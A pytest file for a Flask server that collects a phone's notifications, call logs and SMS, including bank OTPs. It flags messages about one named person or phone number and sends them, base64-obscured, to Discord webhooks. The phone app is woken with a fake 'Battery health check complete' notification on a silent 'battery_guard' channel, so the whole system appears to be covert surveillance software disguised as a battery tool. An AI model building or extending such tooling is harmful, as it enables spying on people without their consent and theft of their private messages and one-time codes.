import os
import pytest
from datetime import datetime, timezone

# Use in-memory SQLite for testing
os.environ['DATABASE_URL'] = 'sqlite:///:memory:'
os.environ['API_KEY'] = 'test-api-key'
os.environ['DASHBOARD_USERNAME'] = 'testuser'
os.environ['DASHBOARD_PASSWORD'] = 'testpass'
os.environ['SECRET_KEY'] = 'test-secret'

from app import app, db, Device, Notification, CallLog, SmsMessage


@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
    with app.app_context():
        db.create_all()
        yield app.test_client()
        db.session.remove()
        db.drop_all()


def test_sync_unauthorized(client):
    response = client.post('/api/v1/sync', json={})
    assert response.status_code == 401
    assert response.get_json()['error'] == 'unauthorized'


def test_sync_invalid_payload(client):
    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        data='invalid json'
    )
    assert response.status_code == 400


def test_sync_missing_device_id(client):
    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json={'notifications': []}
    )
    assert response.status_code == 400


def test_sync_successful_batch(client):
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
    payload = {
        "device_id": "test_np2a_001",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "notifications": [
            {
                "local_id": 101,
                "app_package": "com.whatsapp",
                "app_name": "WhatsApp",
                "title": "Alice",
                "content": "Meeting at 3pm",
                "category": "msg",
                "received_at": now_ms
            }
        ],
        "call_logs": [
            {
                "local_id": 201,
                "phone_number": "+1234567890",
                "contact_name": "Bob",
                "call_type": "incoming",
                "duration_sec": 45,
                "occurred_at": now_ms
            }
        ],
        "sms_messages": [
            {
                "local_id": 301,
                "address": "+1987654321",
                "contact_name": "Charlie",
                "body": "Your verification code is 492019",
                "sms_type": "received",
                "occurred_at": now_ms
            }
        ]
    }

    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    data = response.get_json()
    assert data['status'] == 'ok'
    assert data['received']['notifications'] == [101]
    assert data['received']['call_logs'] == [201]
    assert data['received']['sms_messages'] == [301]

    # Verify database records
    with app.app_context():
        device = db.session.get(Device, "test_np2a_001")
        assert device is not None
        assert device.device_model == "Nothing Phone 2a"

        notifs = Notification.query.filter_by(device_id="test_np2a_001").all()
        assert len(notifs) == 1
        assert notifs[0].title == "Alice"
        assert notifs[0].content == "Meeting at 3pm"

        calls = CallLog.query.filter_by(device_id="test_np2a_001").all()
        assert len(calls) == 1
        assert calls[0].phone_number == "+1234567890"
        assert calls[0].duration_sec == 45

        sms = SmsMessage.query.filter_by(device_id="test_np2a_001").all()
        assert len(sms) == 1
        assert sms[0].body == "Your verification code is 492019"


def test_sync_skips_backup_in_progress_notification(client):
    """Verify that notifications with title 'Backup in progress' are skipped from saving to DB."""
    headers = {'X-API-Key': 'test-api-key'}
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)

    payload = {
        "device_id": "test_np2a_backup_skip",
        "device_model": "Nothing Phone 2a",
        "notifications": [
            {
                "local_id": 991,
                "app_package": "com.whatsapp.w4b",
                "app_name": "WhatsApp Business",
                "title": "Backup in progress",
                "content": "Uploading: 1.0 MB of 1.2 MB (84%)",
                "received_at": now_ms
            },
            {
                "local_id": 992,
                "app_package": "com.whatsapp.w4b",
                "app_name": "WhatsApp Business",
                "title": "Alice",
                "content": "Real message",
                "received_at": now_ms
            }
        ]
    }

    response = client.post('/api/v1/sync', headers=headers, json=payload)
    assert response.status_code == 200
    data = response.get_json()
    assert data['status'] == 'ok'
    # Both local_ids should be acknowledged so client clears backlog
    assert 991 in data['received']['notifications']
    assert 992 in data['received']['notifications']

    with app.app_context():
        notifs = Notification.query.filter_by(device_id="test_np2a_backup_skip").all()
        assert len(notifs) == 1
        assert notifs[0].title == "Alice"


def test_sync_encoded_payload(client):
    import base64
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)

    def b64(s):
        return base64.b64encode(s.encode('utf-8')).decode('ascii')

    payload = {
        "device_id": "test_np2a_encoded",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "notifications": [
            {
                "local_id": 901,
                "app_package": "com.whatsapp",
                "app_name": b64("WhatsApp"),
                "title": b64("Private Contact"),
                "content": b64("Secret confidential message 123"),
                "category": "msg",
                "received_at": now_ms
            }
        ],
        "call_logs": [
            {
                "local_id": 902,
                "phone_number": b64("+9988776655"),
                "contact_name": b64("Dr. John"),
                "call_type": "incoming",
                "duration_sec": 120,
                "occurred_at": now_ms
            }
        ],
        "sms_messages": [
            {
                "local_id": 903,
                "address": b64("+1122334455"),
                "contact_name": None,
                "body": b64("Bank OTP is 849201"),
                "sms_type": "received",
                "occurred_at": now_ms
            }
        ]
    }

    response = client.post(
        '/api/v1/sync',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    with app.app_context():
        n = Notification.query.filter_by(device_id="test_np2a_encoded").first()
        assert n.title == "Private Contact"
        assert n.content == "Secret confidential message 123"

        c = CallLog.query.filter_by(device_id="test_np2a_encoded").first()
        assert c.phone_number == "+9988776655"
        assert c.contact_name == "Dr. John"

def test_device_ping(client):
    payload = {
        "device_id": "test_np2a_ping",
        "device_model": "Nothing Phone 2a",
        "android_version": "14",
        "app_version": "1.0.0",
        "battery_level": 88,
        "is_charging": True,
        "battery_temp": 32.4,
        "ram_used_percent": 55,
        "storage_used_percent": 62,
        "uptime_seconds": 3600
    }

    response = client.post(
        '/api/v1/ping',
        headers={'X-API-Key': 'test-api-key'},
        json=payload
    )

    assert response.status_code == 200
    data = response.get_json()
    assert data['status'] == 'ok'
    assert data['ping_interval_sec'] == 300

    with app.app_context():
        device = db.session.get(Device, "test_np2a_ping")
        assert device is not None
        assert device.battery_level == 88
        assert device.is_charging is True
        assert device.battery_temp == 32.4
        assert device.is_online is True


def test_api_search(client):
    # Populate test data
    now = datetime.now(timezone.utc)
    with app.app_context():
        db.session.add(Device(device_id="dev_search_1", device_model="Pixel 8 Pro", android_version="14", app_version="1.0.0", last_sync=now))
        db.session.add(Notification(device_id="dev_search_1", app_package="com.whatsapp", app_name="WhatsApp", title="Alice", content="Meeting at 5pm", received_at=now))
        db.session.add(CallLog(device_id="dev_search_1", phone_number="+19876543210", contact_name="Bob Smith", call_type="incoming", duration_sec=45, occurred_at=now))
        db.session.add(SmsMessage(device_id="dev_search_1", address="BANK-ALERT", contact_name="Bank", body="Your OTP is 987654", sms_type="inbox", occurred_at=now))
        db.session.commit()

    # Unauthorized search
    r = client.get('/api/v1/search?q=Alice')
    assert r.status_code == 401

    # Authorized search with X-API-Key (case-insensitive)
    r = client.get('/api/v1/search?q=alice', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()
    assert data['total_results'] >= 1
    assert len(data['results']['notifications']) >= 1
    assert data['results']['notifications'][0]['title'] == 'Alice'

    # Search for number pattern across calls & sms
    r = client.get('/api/v1/search?q=9876', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()
    assert data['counts']['calls'] >= 1
    assert data['counts']['sms'] >= 1

    # Category filtered search
    r = client.get('/api/v1/search?q=pixel&type=devices', headers={'X-API-Key': 'test-api-key'})
    assert r.status_code == 200
    data = r.get_json()

def test_discord_important_highlighting(monkeypatch):
    import base64
    from app import send_discord_for_notifications, send_discord_for_calls, send_discord_for_sms

    sent_payloads = []

    def mock_send(payload, is_alert=False):
        sent_payloads.append(payload)

    monkeypatch.setattr('app._send_discord', mock_send)

    # 1. Important Notification test with keyword 'prashant'
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'Prashant Kumar',
            'content': 'Hey, call me back',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    assert 'content' not in sent_payloads[0]  # Nothing revealed in message content
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!M'  # Alert indicator
    assert embed['color'] == 0xED4245  # Alert red color
    assert '⚠️' in embed['description']
    assert 'fields' not in embed  # No plaintext metadata fields
    assert 'prashant' not in embed['description'].lower()  # Keyword not revealed in plaintext
    # Ensure the encoded payload can be decoded
    encoded_part = embed['description'].split(' · ⚠️ · ')[1]
    decoded_text = base64.b64decode(encoded_part).decode()
    assert 'Prashant Kumar' in decoded_text
    assert 'Hey, call me back' in decoded_text

    # 2. Important Call Log test with keyword '9871920832'
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+919871920832',
            'contact_name': 'Unknown',
            'call_type': 'incoming',
            'duration_sec': 120
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    assert 'content' not in sent_payloads[0]
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!T'
    assert embed['color'] == 0xED4245
    assert '⚠️' in embed['description']
    assert 'fields' not in embed
    assert '9871920832' not in embed['description']  # Phone number not in plaintext
    encoded_part = embed['description'].split(' · ⚠️ · ')[1]
    decoded_text = base64.b64decode(encoded_part).decode()
    assert '+919871920832' in decoded_text

    # 3. Important SMS test with keyword 'prashant'
    sent_payloads.clear()
    send_discord_for_sms([
        {
            'address': '9999999999',
            'contact_name': 'Friend',
            'body': 'Meeting with prashant at 4pm',
            'sms_type': 'inbox'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    assert 'content' not in sent_payloads[0]
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!S'
    assert embed['color'] == 0xED4245
    assert '⚠️' in embed['description']
    assert 'fields' not in embed
    assert 'prashant' not in embed['description'].lower()
    encoded_part = embed['description'].split(' · ⚠️ · ')[1]
    decoded_text = base64.b64decode(encoded_part).decode()
    assert 'Meeting with prashant' in decoded_text

    # 4. Uppercase case-insensitivity test ('PRASHANT')
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'ALERT FROM PRASHANT',
            'content': 'URGENT MESSAGE',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!M'
    assert embed['color'] == 0xED4245
    assert '⚠️' in embed['description']

    # 5. Formatted phone number test ('+91-98719-20832')
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+91-98719-20832',
            'contact_name': 'Unknown Caller',
            'call_type': 'incoming',
            'duration_sec': 50
        }
    ], 'device_test_123456')

    assert len(sent_payloads) == 1
    embed = sent_payloads[0]['embeds'][0]
    assert embed['title'] == '!T'
    assert embed['color'] == 0xED4245
    assert '⚠️' in embed['description']

    # 6. Regular notification (no keyword match) -> not sent to Discord
    sent_payloads.clear()
    send_discord_for_notifications([
        {
            'app_package': 'com.whatsapp',
            'app_name': 'WhatsApp',
            'title': 'Random Sender',
            'content': 'Hello world',
            'category': 'VoIP & Social Messages'
        }
    ], 'device_test_123456')
    assert len(sent_payloads) == 0

    # 7. Regular call (no keyword match) -> not sent to Discord
    sent_payloads.clear()
    send_discord_for_calls([
        {
            'phone_number': '+911234567890',
            'contact_name': 'Normal Caller',
            'call_type': 'incoming',
            'duration_sec': 30
        }
    ], 'device_test_123456')
    assert len(sent_payloads) == 0

    # 8. Regular SMS (no keyword match) -> not sent to Discord
    sent_payloads.clear()
    send_discord_for_sms([
        {
            'address': '1234567890',
            'contact_name': 'Normal Friend',
            'body': 'Hello there',
            'sms_type': 'inbox'
        }
    ], 'device_test_123456')
    assert len(sent_payloads) == 0



def test_fcm_wake_payload_includes_notification(monkeypatch):
    """Verify the FCM wake message includes a visible notification payload.

    NothingOS (and similar aggressive OEM skins) drop data-only FCM messages
    to force-stopped apps.  Including a `notification` block guarantees delivery.
    """
    captured_payloads = []

    class MockResponse:
        status_code = 200
        text = '{"name":"projects/test/messages/123"}'

    def mock_post(url, headers=None, json=None, timeout=None):
        captured_payloads.append(json)
        return MockResponse()

    # Stub out _get_fcm_access_token to return a fake token
    monkeypatch.setattr('app._get_fcm_access_token', lambda: 'fake-access-token')
    monkeypatch.setattr('app.FCM_PROJECT_ID', 'test-project')

    import requests as _req
    monkeypatch.setattr(_req, 'post', mock_post)

    from app import _send_fcm_wake
    result = _send_fcm_wake('fake-fcm-token', 'test-device-123')

    assert result is True
    assert len(captured_payloads) == 1

    msg = captured_payloads[0]['message']

    # Must have a notification payload (required for force-stopped app wake)
    assert 'notification' in msg, "FCM message must include a notification payload for force-stop wake"
    assert msg['notification']['title'] == 'Battery health check complete'
    assert msg['notification']['body'] == 'Your battery is in good condition ✓'

    # Must have high priority
    assert msg['android']['priority'] == 'HIGH'

    # Must target the battery_guard_silent channel for silent delivery
    assert msg['android']['notification']['channel_id'] == 'battery_guard_silent'

    # Must still include data payload with wake type
    assert msg['data']['type'] == 'wake'
    assert msg['data']['device_id'] == 'test-device-123'


def test_get_matched_alert_keyword():
    from app import get_matched_alert_keyword, is_important_content

    # Name matching (case-insensitive)
    assert get_matched_alert_keyword("Hello Prashant") == "prashant"
    assert get_matched_alert_keyword("prashant kumar") == "prashant"
    assert get_matched_alert_keyword("URGENT: PRASHANT CALLED") == "prashant"
    assert is_important_content("PRASHANT") is True

    # Phone number matching (various formats)
    assert get_matched_alert_keyword("+919871920832") == "9871920832"
    assert get_matched_alert_keyword("9871920832") == "9871920832"
    assert get_matched_alert_keyword("+91 98719 20832") == "9871920832"
    assert get_matched_alert_keyword("+91-98719-20832") == "9871920832"
    assert get_matched_alert_keyword("Call from (987) 192-0832") == "9871920832"
    assert is_important_content("+919871920832") is True

    # Non-matching cases
    assert get_matched_alert_keyword("Random text message") is None
    assert get_matched_alert_keyword("+919800000000") is None
    assert get_matched_alert_keyword("") is None
    assert get_matched_alert_keyword(None) is None
    assert is_important_content("Random text") is False


def test_discord_alert_webhook_routing(monkeypatch):
    from app import _send_discord
    import requests as _req

    calls = []

    def mock_post(url, json=None, timeout=None):
        calls.append({'url': url, 'json': json})

    monkeypatch.setattr(_req, 'post', mock_post)
    monkeypatch.setattr('app.DISCORD_WEBHOOK_URL', 'https://discord.example.com/main')
    monkeypatch.setattr('app.DISCORD_ALERT_WEBHOOK_URL', 'https://discord.example.com/alerts')

    # Alert routing
    _send_discord({'test': 'alert'}, is_alert=True)
    assert len(calls) == 1
    assert calls[0]['url'] == 'https://discord.example.com/alerts'

    # Normal routing
    _send_discord({'test': 'normal'}, is_alert=False)
    assert len(calls) == 2
    assert calls[1]['url'] == 'https://discord.example.com/main'


